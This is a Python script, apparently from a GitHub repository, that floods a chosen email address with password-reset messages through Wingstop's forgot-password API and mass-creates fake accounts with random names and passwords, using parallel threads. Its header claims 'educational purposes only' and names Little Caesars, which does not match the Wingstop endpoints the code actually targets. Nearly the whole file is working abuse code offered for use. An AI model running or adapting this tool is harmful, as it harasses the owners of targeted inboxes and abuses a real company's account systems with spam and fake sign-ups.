# 
# This was made to test the functionality of the website https://www.littlecaesars.com/en-us/
# This was made for educational purposes only.
# Author: @Daulaires / https://www.github.com/Daulaires/LittleCaesarsEmailSpammer
# Date: 2024-05-04 3:33AM
# 

import math
from random import Random
import requests
import argparse
from concurrent.futures import ThreadPoolExecutor

def send_email(email):
    url = 'https://api.wingstop.com/users/forgotpassword'
    data = {'emailaddress': email}
    headers = {
        'Origin': 'https://www.wingstop.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://www.wingstop.com/account/login',
        'ClientId': 'wingstop',
        'Nomnom-Platform': 'web',
    }
    session = requests.Session()
    response = session.post(url, json=data, headers=headers, timeout=10)
    if response.status_code == 200:
        print(f"[!] {email}")
    else:
        print(response.text)

def create_account(email, firstname, lastname, password):
    url = 'https://api.wingstop.com/users/create'
    data = {
        "contactnumber": None,
        "emailaddress": email,
        "firstname": firstname,
        "lastname": lastname,
        "optin": True,
        "password": password,
        "nomnom": {
            "zip": None,
            "dobyear": Random().randint(1970, 2000),
            "country": "USA"
        }
    }
    headers = {
        'Origin': 'https://www.wingstop.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://www.wingstop.com/account/login',
        'ClientId': 'wingstop',
        'Nomnom-Platform': 'web',
    }
    session = requests.Session()
    response = session.post(url, json=data, headers=headers)
    if response.status_code == 200:
        print(f"[+] Account created for {email}")
    else:
        print(f"[-] Failed to create account for {email}. Status code: {response.status_code}")
        print(response.text)

def randomlyGeneratedAccount():
    import random
    import string
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
    firstname = ''.join(random.choices(string.ascii_lowercase, k=10))
    lastname = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return email, firstname, lastname, password

def createAccountWithRandomData():
    email, firstname, lastname, password = randomlyGeneratedAccount()
    create_account(email, firstname, lastname, password)
    return email, firstname, lastname, password

parser = argparse.ArgumentParser(description='Wingstop Spammer and Account Creator')
subparsers = parser.add_subparsers(dest='command')

spam_parser = subparsers.add_parser('spam', help='Spam the email.')
spam_parser.add_argument('email', type=str, help='The email to spam.')
spam_parser.add_argument('times', type=int, help='The number of times to spam the email.', default=1)

create_account_parser = subparsers.add_parser('create_account', help='Create a new Wingstop account.')
create_account_parser.add_argument('email', type=str, help='The email for the new account.')
create_account_parser.add_argument('firstname', type=str, help='The first name for the new account.')
create_account_parser.add_argument('lastname', type=str, help='The last name for the new account.')
create_account_parser.add_argument('password', type=str, help='The password for the new account.')
create_account_parser.add_argument('times', type=int, help='The number of times to attempt account creation.', default=1)

create_account_with_random_data_parser = subparsers.add_parser('create_account_with_random_data', help='Create a new Wingstop account with random data.')
create_account_with_random_data_parser.add_argument('times', type=int, help='The number of times to attempt account creation.', default=1)

args = parser.parse_args()

if args.command == 'spam':
    # SPAM THE EMAIL
    with ThreadPoolExecutor(max_workers=4) as executor:
        for _ in range(args.times):
            executor.submit(send_email, args.email)
elif args.command == 'create_account':
    # CREATE ACCOUNT
    with ThreadPoolExecutor(max_workers=4) as executor:
        for _ in range(args.times):
            executor.submit(create_account, args.email, args.firstname, args.lastname, args.password)
elif args.command == 'create_account_with_random_data':
    # CREATE ACCOUNT WITH RANDOM DATA
    with ThreadPoolExecutor(max_workers=4) as executor:
        for _ in range(args.times):
            executor.submit(createAccountWithRandomData)
